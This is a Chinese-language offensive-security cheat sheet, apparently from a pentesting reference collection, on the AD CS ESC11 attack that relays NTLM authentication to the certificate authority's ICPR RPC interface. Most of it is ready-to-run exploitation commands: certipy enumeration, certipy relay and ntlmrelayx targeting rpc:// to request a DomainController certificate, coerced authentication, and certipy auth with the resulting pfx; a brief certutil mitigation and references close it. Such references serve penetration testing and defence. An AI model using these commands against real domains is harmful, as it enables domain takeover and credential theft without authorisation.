# Active Directory - 证书 ESC11

## ESC11 - NTLM 中继到 ICPR

> ICPR 请求未强制加密，且请求处置设置为"颁发"。

**工具**：

* [ly4k/Certipy](https://github.com/ly4k/Certipy) - Certipy 官方版
* [sploutchy/Certipy](https://github.com/sploutchy/Certipy) - Certipy 分支版
* [sploutchy/impacket](https://github.com/sploutchy/impacket) - Impacket 分支版

**利用方法**：

1. 在 certipy 输出中查找 `Enforce Encryption for Requests: Disabled`。

    ```ps1
    certipy find -u user@dc1.lab.local -p 'REDACTED' -dc-ip 10.10.10.10 -stdout
    Enforce Encryption for Requests : Disabled
    ESC11: Encryption is not enforced for ICPR (RPC) requests.
    ```

2. 使用 Impacket ntlmrelay 建立中继并触发连接。

    ```ps1
    certipy relay -target rpc://dc.domain.local -ca 'DOMAIN-CA' -template DomainController
    # 或
    ntlmrelayx.py -t rpc://10.10.10.10 -rpc-mode ICPR -icpr-ca-name lab-DC-CA -smb2support
    ```

3. 从特权帐户（如域控制器）强制身份认证。
4. 使用获得的证书

    ```ps1
    certipy auth -pfx dc.pfx
    ```

**缓解措施**：

强制 **RPC 加密**（数据包隐私）。

```powershell
certutil -getreg CA\InterfaceFlags
certutil -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST
net stop certsvc
net start certsvc
```

## 参考资料

* [ESC11: NTLM Relay to AD CS RPC Interface - Oliver Lyak - May 15, 2025](https://github.com/ly4k/Certipy/wiki/06-‐-Privilege-Escalation#esc11-ntlm-relay-to-ad-cs-rpc-interface)
* [GOAD - part 14 - ADCS 5/7/9/10/11/13/14/15 - Mayfly - March 10, 2025](https://mayfly277.github.io/posts/ADCS-part14/)
* [Relaying to AD Certificate Services over RPC - SYLVAIN HEINIGER - November 16, 2022](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
